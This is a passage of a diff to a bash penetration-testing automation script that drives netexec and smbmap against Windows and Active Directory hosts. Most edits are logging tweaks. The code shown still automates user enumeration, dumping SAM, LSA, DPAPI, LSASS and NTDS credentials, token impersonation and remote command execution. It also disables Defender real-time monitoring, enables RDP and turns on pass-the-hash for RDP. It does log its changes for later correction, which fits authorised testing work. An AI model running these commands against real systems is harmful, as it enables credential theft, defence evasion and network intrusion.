+							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
 						fi
 					fi
 				fi
@@ -984,7 +1001,7 @@ smb () {
 				$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --pass-pol < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_pass_pol 2>/dev/null
 				check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_pass_pol | wc -l)
 				if [ "$check_smb" -gt 1 ]; then
-					green_log "${SPACE}[💀] Password Policy found -> ${DIR_VULNS}/smb/cme_${ip}_pass_pol"
+					green_log "${SPACE}${SPACE}[💀] Password Policy found -> ${DIR_VULNS}/smb/cme_${ip}_pass_pol"
 				fi
 				
 				###### RETRIEVE USERS ######
@@ -993,7 +1010,7 @@ smb () {
 				cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser' |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | wc -l)
 				if [[ "$check_smb" -gt 4 ]]; then
-					green_log "${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
+					green_log "${SPACE}${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
 
 					## Injecter ces utilisateurs dans un fichier
 					cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
@@ -1004,7 +1021,7 @@ smb () {
 				$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_users 2>/dev/null
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_users | wc -l)
 				if [[ "$check_smb" -gt 4 ]]; then
-					green_log "${SPACE}[💀] New users found (check descriptions can be interesting) -> ${DIR}/users_with_descriptions.txt"
+					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 								
 					## Injecter ces utilisateurs dans un fichier
 					cat ${DIR_VULNS}/smb/cme_${ip}_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
@@ -1020,7 +1037,7 @@ smb () {
 					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_sam | wc -l)
 					
 					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}[💀] Success dump SAM -> ${DIR_VULNS}/smb/cme_${ip}_sam"
+						green_log "${SPACE}${SPACE}[💀] Success dump SAM -> ${DIR_VULNS}/smb/cme_${ip}_sam"
 					fi
 					
 					###### DUMP LSA ######
@@ -1028,7 +1045,7 @@ smb () {
 					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsa | wc -l)
 					
 					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}[💀] Success dump LSA -> ${DIR_VULNS}/smb/cme_${ip}_lsa"
+						green_log "${SPACE}${SPACE}[💀] Success dump LSA -> ${DIR_VULNS}/smb/cme_${ip}_lsa"
 					fi
 					
 					###### DUMP DPAPI ######
@@ -1036,7 +1053,7 @@ smb () {
 					check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)
 					
 					if [ "$check_smb" -gt 0 ]; then
-						green_log "${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
+						green_log "${SPACE}${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
 					fi
 					
 					##### IMPERSONATE #####
@@ -1044,8 +1061,8 @@ smb () {
 					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_impersonate | wc -l)
 					
 					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
-						blue_log "${SPACE} [+] Possibility to exploit via : $proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate -o TOKEN=1 EXEC='whoami'"
+						green_log "${SPACE}${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
+						blue_log "${SPACE}${SPACE} [+] Possibility to exploit via : $proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate -o TOKEN=1 EXEC='whoami'"
 					fi
 					
 					
@@ -1054,10 +1071,10 @@ smb () {
 					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_cmd | wc -l)
 					
 					if [ "$check_smb" -gt 1 ]; then
-						green_log "${SPACE}[💀] Success command execution"
+						green_log "${SPACE}${SPACE}[💀] Success command execution"
 						
 						#Disabling RealTimeMonitoring
-						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null
+						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null > /dev/null 2>/dev/null
 						
 						#### Extract LSSAS only on VM that are not DC - to avoid possible crash ..
 						if [ $(cat $DIR_PORTS/88.txt | grep -aqi "$ip"; echo $?) -eq 1 ]; then
@@ -1066,7 +1083,7 @@ smb () {
 							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsass | wc -l)
 
 							if [[ "$check_smb" -gt 0 ]] && ! grep -q "No credentials found" "${DIR_VULNS}/smb/cme_${ip}_lsass"; then
-								green_log "${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
+								green_log "${SPACE}${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
 							fi
 						else
 							##### NTDS extract #####
@@ -1074,7 +1091,7 @@ smb () {
 							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_ntds | wc -l)
 							
 							if [ "$check_smb" -gt 1 ]; then
-								green_log "${SPACE}[💀] Success dump NTDS -> ${DIR_VULNS}/smb/cme_${ip}_ntds"
+								green_log "${SPACE}${SPACE}[💀] Success dump NTDS -> ${DIR_VULNS}/smb/cme_${ip}_ntds"
 							fi
 						fi
 						
@@ -1082,7 +1099,7 @@ smb () {
 						$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x 'query user' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp 2>/dev/null
 						check_smb=$(grep -aEi 'Déco|Deco|Dis' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp | wc -l)
 						if [ "$check_smb" -gt 0 ]; then
-							green_log "${SPACE}[💀] Found RDP session disconnected -> ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp"
+							green_log "${SPACE}${SPACE}[💀] Found RDP session disconnected -> ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp"
 						fi
 						#If RDP is not enabled
 						if ! grep -q "$ip" $DIR_PORTS/3389.txt;then 
@@ -1105,7 +1122,7 @@ smb () {
 							#Check the RDP service
 							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'powershell Get-Service -Name "TermService"' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp 2>/dev/null
 							if grep -qi 'Running' ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp;then
-								orange_log "${SPACE}[💀] RDP is now activate (it wasn't) on $host (${ip}) -> Changement added in $DIR/modifs.txt"
+								orange_log "${SPACE}${SPACE}[💀] RDP is now activate (it wasn't) on $host (${ip}) -> Changement added in $DIR/modifs.txt"
 								 echo -e "\nACTION : Enabling RDP on $host (${ip}" >> $DIR/modifs.txt
 								 echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'" >> $DIR/modifs.txt
 								 echo "$actual_modification" >> $DIR/modifs.txt
@@ -1131,7 +1148,7 @@ smb () {
 							rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
 						else
 							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'  < /dev/null 2>/dev/null
-							orange_log "${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
+							orange_log "${SPACE}${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
 							echo -e "\nACTION :" >> $DIR/modifs.txt
 							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> $DIR/modifs.txt
 							echo "CORRECTION ->" >> $DIR/modifs.txt
@@ -1159,7 +1176,7 @@ web () {
 		elif [[ $line =~ ^([0-9]+)/tcp ]]; then
 			# Extract port number and protocol
 			port="${BASH_REMATCH[1]}"
-			if [[ $line =~ (http|https) && ! $line =~ ncacn_http ]]; then
+			if [[ $line =~ (http|https) && ! $line =~ ncacn_http && $port != "5985" && $port != "5357" ]]; then
 			  whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
 			  HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
 			  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
@@ -1260,7 +1277,7 @@ krb () {
 		fi
 
 		if { ! grep -q 'No entries' "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" && [[ -e "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" ]] ; } || grep -q 'krb5tgs' "$DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt"; then
-			green_log "${SPACE}[💀] Great, there are kerberoastable accounts found -> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt"
+			green_log "${SPACE}[💀] Great, kerberoastable accounts found -> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt"
 			blue_log "${SPACE} [+] Use hashcat -m 13100 ... to bang them passwords"
 		fi
 		
